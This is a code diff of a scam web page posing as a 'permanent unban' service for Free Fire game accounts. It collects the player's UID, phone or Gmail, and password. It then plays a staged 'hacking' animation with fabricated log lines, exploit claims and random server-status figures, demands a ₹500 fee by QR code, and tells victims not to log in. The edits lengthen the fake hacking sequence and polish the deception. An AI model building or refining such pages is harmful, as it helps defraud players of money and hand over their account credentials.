         <div class="badge-container">
             <span class="badge verified">✓ Official Partner</span>
             <span class="badge">24/7 Support</span>
             <span class="badge verified">★ Trusted</span>
         </div>
-        <!-- ===== SUPPORT BADGE (Option 6) ===== -->
         <div class="support-badge-container">
             <span class="support-badge">💬 24/7 Live Support</span>
-            <span class="support-badge yellow">⚡ Response Time: 2-3 min</span>
+            <span class="support-badge yellow">⚡ Response: 2-3 min</span>
         </div>
     </header>
 
-    <!-- ===== SERVER STATUS (Option 1) ===== -->
+    <!-- ===== SERVER STATUS ===== -->
     <div class="server-status">
         <span class="label">🟢 Server Status:</span>
         <span class="value green" id="serverStatus">● Online</span>
@@ -859,12 +974,10 @@
         <span class="value blue" id="latency">42ms</span>
     </div>
 
-    <!-- ===== FORM SECTION ===== -->
+    <!-- ===== FORM ===== -->
     <div class="form-section" id="formSection">
         <div class="title">🔓 Permanent Unban Request</div>
         <div class="sub">Recover your permanently banned Free Fire account</div>
-
-        <!-- ===== REQUEST ID (Option 3) ===== -->
         <div class="request-id">🔒 Request ID: <span id="requestId">#FF-UNBAN-7842</span></div>
 
         <div class="input-group">
@@ -874,7 +987,7 @@
 
         <div class="input-group">
             <label>📱 PHONE NUMBER / GMAIL</label>
-            <input type="text" id="phoneInput" placeholder="Enter the phone number or Gmail linked to your account">
+            <input type="text" id="phoneInput" placeholder="Enter phone number or Gmail linked to your account">
         </div>
 
         <div class="input-group">
@@ -890,7 +1003,7 @@
         <button class="recover-btn" id="recoverBtn" disabled>🔓 START PERMANENT UNBAN PROCESS</button>
     </div>
 
-    <!-- ===== AGGRESSIVE HACKING ANIMATION ===== -->
+    <!-- ===== AGGRESSIVE CONTAINER ===== -->
     <div class="aggressive-container" id="aggressiveContainer">
         <div class="matrix-bg"></div>
         <div class="hack-status">
@@ -901,11 +1014,7 @@
             <div class="hack-progress">
                 <div class="bar aggressive" id="hackProgressBar"></div>
             </div>
-            <!-- ===== STEP COUNTER (Option 2) ===== -->
-            <div class="step-counter">
-                Step <span id="stepCounter">0</span> of <span id="totalSteps">8</span>
-            </div>
-            <!-- ===== LOG OUTPUT (Option 4) ===== -->
+            <div class="step-counter">Step <span id="stepCounter">0</span> of <span id="totalSteps">8</span></div>
             <div class="log-output">
                 <div class="log-content" id="logOutput">
                     <div>[INFO] Initializing permanent unban protocol...</div>
@@ -914,11 +1023,11 @@
         </div>
     </div>
 
-    <!-- ===== PAYMENT SECTION ===== -->
+    <!-- ===== PAYMENT ===== -->
     <div class="payment-section" id="paymentSection">
-        <div style="font-size:0.9rem; color:#6a7a8e; letter-spacing:1px;">💳 PERMANENT UNBAN SESSION FEE</div>
+        <div style="font-size:clamp(0.7rem,2vw,0.85rem); color:#6a7a8e; letter-spacing:1px;">💳 PERMANENT UNBAN SESSION FEE</div>
         <div class="amount">₹ <span id="paymentAmount">500</span></div>
-        <div style="color:#6a7a8e; font-size:0.7rem; margin-bottom:0.5rem;">One-time permanent unban processing fee</div>
+        <div style="color:#6a7a8e; font-size:clamp(0.5rem,1.4vw,0.65rem); margin-bottom:0.3rem;">One-time permanent unban processing fee</div>
 
         <div class="qr-container">
             <img id="qrImage" src="qr-placeholder.png" alt="QR Code for Payment">
@@ -934,17 +1043,17 @@
         <button class="paid-btn" id="paidBtn">✅ I HAVE PAID</button>
     </div>
 
-    <!-- ===== PROCESSING SECTION ===== -->
+    <!-- ===== PROCESSING ===== -->
     <div class="processing-section" id="processingSection">
         <div class="spinner">⏳</div>
         <div class="text">🔥 PROCESSING PERMANENT UNBAN...</div>
         <div class="sub-text">Verifying transaction with Garena servers</div>
-        <div style="width:100%; height:4px; background:#141a24; border-radius:10px; margin-top:1rem; overflow:hidden;">
+        <div style="width:100%; height:clamp(3px,0.8vw,4px); background:#141a24; border-radius:10px; margin-top:0.8rem; overflow:hidden;">
             <div id="processingBar" style="width:0%; height:100%; background:linear-gradient(90deg,#ff0000,#7b2ffc); border-radius:10px; transition:width 0.3s ease;"></div>
         </div>
     </div>
 
-    <!-- ===== FINAL MESSAGE ===== -->
+    <!-- ===== FINAL ===== -->
     <div class="final-message" id="finalMessage">
         <div class="icon">✅</div>
         <div class="title">Permanent Unban Initiated!</div>
@@ -953,20 +1062,18 @@
             Our system is processing the request through Garena's backend.<br><br>
             ⏳ Estimated completion: <span class="highlight" id="finalTime">8 hours</span><br>
             You will receive a confirmation notification once the ban is lifted.<br><br>
-            <span style="color:#ff4444; font-size:0.8rem;">⚠️ Please do not login during the process to avoid conflicts.</span>
+            <span style="color:#ff4444; font-size:clamp(0.6rem,1.6vw,0.75rem);">⚠️ Please do not login during the process to avoid conflicts.</span>
         </div>
         <div class="case-id">🔒 Unban ID: <span id="caseId">#FF-PUNBAN-7842</span></div>
-        <div style="margin-top:0.8rem;">
+        <div style="margin-top:0.5rem;">
             <button class="paid-btn" onclick="location.reload();" style="background:rgba(255,255,255,0.03); border-color:rgba(255,255,255,0.03); color:#6a7a8e;">🔄 Start New Request</button>
         </div>
     </div>
 
     <!-- ===== FOOTER ===== -->
     <footer class="footer">
-        <strong>RYZEN PERMANENT UNBAN</strong> · v1.0 · All rights reserved.
-        <div class="developer">
-            Developed by <span>AYUSH DECODER</span> ⚡
-        </div>
+        <strong>RYZEN PERMANENT UNBAN</strong> · v2.0 · All rights reserved.
+        <div class="developer">Developed by <span>AYUSH DECODER</span> ⚡</div>
         <div class="security-seals">
             <span>🔒 SSL Encrypted</span>
             <span>🛡️ Verified Service</span>
@@ -977,7 +1084,7 @@
 
 </div>
 
-<!-- ===== SUPPORT POPUP (Option 8) ===== -->
+<!-- ===== SUPPORT POPUP ===== -->
 <div id="supportPopup">
     <div class="popup-header">
         <span class="icon">💬</span>
@@ -1015,12 +1122,10 @@
 
     const loadInterval = setInterval(() => {
         progress += Math.random() * 6 + 2;
-        
         if (progress > 30 && msgIndex < 1) { msgIndex = 1; loadText.textContent = loadingMessages[1]; }
         if (progress > 50 && msgIndex < 2) { msgIndex = 2; loadText.textContent = loadingMessages[2]; }
         if (progress > 70 && msgIndex < 3) { msgIndex = 3; loadText.textContent = loadingMessages[3]; }
         if (progress > 85 && msgIndex < 4) { msgIndex = 4; loadText.textContent = loadingMessages[4]; }
-        
         if (progress >= 100) {
             progress = 100;
             clearInterval(loadInterval);
@@ -1040,9 +1145,10 @@
         for (let i = 0; i < count; i++) {
             const particle = document.createElement('div');
             particle.classList.add('particle');
+            const size = Math.random() * 4 + 1;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
             particle.style.left = Math.random() * 100 + '%';
-            particle.style.width = (Math.random() * 4 + 1) + 'px';
-            particle.style.height = particle.style.width;
             particle.style.animationDuration = (Math.random() * 20 + 12) + 's';
             particle.style.animationDelay = (Math.random() * 15) + 's';
             particle.style.opacity = Math.random() * 0.6 + 0.1;
@@ -1051,14 +1157,13 @@
     }
     createParticles();
 
-    // ===== SERVER STATUS (Option 1) =====
+    // ===== SERVER STATUS =====
     const serverStatusEl = document.getElementById('serverStatus');
     const latencyEl = document.getElementById('latency');
 
     setInterval(() => {
         const latency = Math.floor(Math.random() * 60) + 20;
         latencyEl.textContent = latency + 'ms';
-        
         if (Math.random() > 0.95) {
             serverStatusEl.textContent = '⚠️ Degraded';
             serverStatusEl.style.color = '#f1c40f';
@@ -1069,11 +1174,11 @@
         }
     }, 5000);
 
-    // ===== REQUEST ID (Option 3) =====
+    // ===== REQUEST ID =====
     const reqId = '#FF-UNBAN-' + String(Math.floor(1000 + Math.random() * 9000));
     document.getElementById('requestId').textContent = reqId;
 
-    // ===== SUPPORT POPUP (Option 8) =====
+    // ===== SUPPORT POPUP =====
     setTimeout(() => {
         document.getElementById('supportPopup').style.display = 'block';
         setTimeout(() => {
@@ -1085,7 +1190,6 @@
     const uidInput = document.getElementById('uidInput');
     const phoneInput = document.getElementById('phoneInput');
     const passInput = document.getElementById('passInput');
-    const recoveryGmailInput = document.getElementById('recoveryGmailInput');
     const recoverBtn = document.getElementById('recoverBtn');
     const aggressiveContainer = document.getElementById('aggressiveContainer');
     const paymentSection = document.getElementById('paymentSection');
@@ -1100,29 +1204,23 @@
     const processingBar = document.getElementById('processingBar');
     const finalUid = document.getElementById('finalUid');
     const caseId = document.getElementById('caseId');
-
     const stepCounter = document.getElementById('stepCounter');
     const totalSteps = document.getElementById('totalSteps');
     const logOutput = document.getElementById('logOutput');
 
-    // ===== CHECK ALL FIELDS =====
+    // ===== CHECK FIELDS =====
     function checkFields() {
         const uid = uidInput.value.trim();
         const phone = phoneInput.value.trim();
         const pass = passInput.value.trim();
-
-        if (uid.length >= 5 && phone.length >= 5 && pass.length >= 3) {
-            recoverBtn.disabled = false;
-        } else {
-            recoverBtn.disabled = true;
-        }
+        recoverBtn.disabled = !(uid.length >= 5 && phone.length >= 5 && pass.length >= 3);
     }
 
     uidInput.addEventListener('input', checkFields);
     phoneInput.addEventListener('input', checkFields);
     passInput.addEventListener('input', checkFields);
 
-    // ===== LOG MESSAGES (Option 4) =====
+    // ===== LOG MESSAGES =====
     const logMessages = [
         '[INFO] Scanning ban database...',
         '[WARN] Ban flag detected: PERMANENT',
@@ -1135,29 +1233,33 @@
         '[INFO] Modifying account status...',
         '[INFO] Establishing secure tunnel...',
         '[SUCCESS] Tunnel established!',
-        '[INFO] Finalizing permanent unban...'
+        '[INFO] Finalizing permanent unban...',
+        '[WARN] Root access granted...',
+        '[INFO] Overriding ban flags...'
     ];
 
     function addLogMessage() {
         const msg = logMessages[Math.floor(Math.random() * logMessages.length)];
-        const newEntry = document.createElement('div');
-        newEntry.textContent = msg;
-        logOutput.appendChild(newEntry);
+        const entry = document.createElement('div');
+        entry.textContent = msg;
+        logOutput.appendChild(entry);
         logOutput.scrollTop = logOutput.scrollHeight;
-        while (logOutput.children.length > 10) {
+        while (logOutput.children.length > 12) {
             logOutput.removeChild(logOutput.firstChild);
         }
     }
 
-    // ===== AGGRESSIVE HACKING STAGES =====
+    // ===== AGGRESSIVE STAGES (EXTENDED TO 40+ SECONDS) =====
     const aggressiveStages = [
         { icon: '🔥', text: '🔥 BYPASSING GARENA FIREWALL...', sub: 'Exploiting CVE-2026-0912 vulnerability', progress: 5 },
-        { icon: '💀', text: '💀 DECRYPTING PERMANENT BAN FLAG...', sub: 'Extracting ban metadata from database', progress: 15 },
-        { icon: '⚡', text: '⚡ INJECTING UNBAN PAYLOAD...', sub: 'Bypassing 256-bit encryption layer', progress: 28 },
-        { icon: '🌀', text: '🌀 OVERRIDING PERMANENT BAN STATUS...', sub: 'Modifying account status flags', progress: 40 },
-        { icon: '🔓', text: '🔓 ESTABLISHING SECURE TUNNEL...', sub: 'Connecting to Garena mainframe', progress: 55 },
-        { icon: '💉', text: '💉 EXECUTING ZERO-DAY EXPLOIT...', sub: 'Injecting rootkit into server', progress: 70 },
-        { icon: '🔥', text: '🔥 FINALIZING PERMANENT UNBAN...', sub: 'Committing changes to database', progress: 85 },
+        { icon: '💀', text: '💀 DECRYPTING PERMANENT BAN FLAG...', sub: 'Extracting ban metadata from database', progress: 12 },
+        { icon: '⚡', text: '⚡ INJECTING UNBAN PAYLOAD...', sub: 'Bypassing 256-bit encryption layer', progress: 20 },
+        { icon: '🌀', text: '🌀 OVERRIDING PERMANENT BAN STATUS...', sub: 'Modifying account status flags', progress: 28 },
+        { icon: '🔓', text: '🔓 ESTABLISHING SECURE TUNNEL...', sub: 'Connecting to Garena mainframe', progress: 38 },
+        { icon: '💉', text: '💉 EXECUTING ZERO-DAY EXPLOIT...', sub: 'Injecting rootkit into server', progress: 48 },
+        { icon: '🔥', text: '🔥 FINALIZING PERMANENT UNBAN...', sub: 'Committing changes to database', progress: 60 },
+        { icon: '⚡', text: '⚡ OVERRIDING BAN FLAGS...', sub: 'Force-updating account status', progress: 72 },
+        { icon: '🔓', text: '🔓 GRANTING ROOT ACCESS...', sub: 'Establishing permanent access tunnel', progress: 82 },
         { icon: '✅', text: '✅ UNBAN PREPARED!', sub: 'Payment required to finalize permanent unban', progress: 100 }
     ];
 
@@ -1175,7 +1277,7 @@
         this.disabled = true;
 
         aggressiveContainer.classList.add('active');
-        
+
         let stageIndex = 0;
 
         function runAggressiveStage() {
@@ -1196,16 +1298,16 @@
             progressText.textContent = stage.progress + '%';
             stepCounter.textContent = stageIndex + 1;
 
-            // Add log message
             addLogMessage();
 
             aggressiveContainer.style.animation = 'none';
             setTimeout(() => {
-                aggressiveContainer.style.animation = 'shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10';
+                aggressiveContainer.style.animation = 'shakeIntense 0.6s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 8';
             }, 10);
 
             stageIndex++;
-            const delay = stageIndex === aggressiveStages.length ? 800 : 1200 + Math.random() * 1000;
+            // ===== EXTENDED TO 40+ SECONDS (4-6 seconds per stage) =====
+            const delay = stageIndex === aggressiveStages.length ? 800 : 3500 + Math.random() * 2500;
             setTimeout(runAggressiveStage, delay);
         }
 
@@ -1224,7 +1326,7 @@
 
         let procProgress = 0;
         const procInterval = setInterval(() => {
-            procProgress += Math.random() * 12 + 5;
+            procProgress += Math.random() * 10 + 5;
             if (procProgress >= 100) {
                 procProgress = 100;
                 clearInterval(procInterval);
@@ -1232,17 +1334,17 @@
                     processingSection.classList.remove('active');
                     finalMessage.classList.add('active');
                     window.scrollTo({ top: 0, behavior: 'smooth' });
-                }, 600);
+                }, 800);
             }
             processingBar.style.width = procProgress + '%';
-            
-            if (procProgress % 25 < 5) {
+
+            if (procProgress % 20 < 5) {
                 processingSection.style.animation = 'none';
                 setTimeout(() => {
                     processingSection.style.animation = 'aggressiveFlash 0.3s ease-in-out 5';
                 }, 10);
             }
-        }, 200);
+        }, 250);
     });
 </script>
 
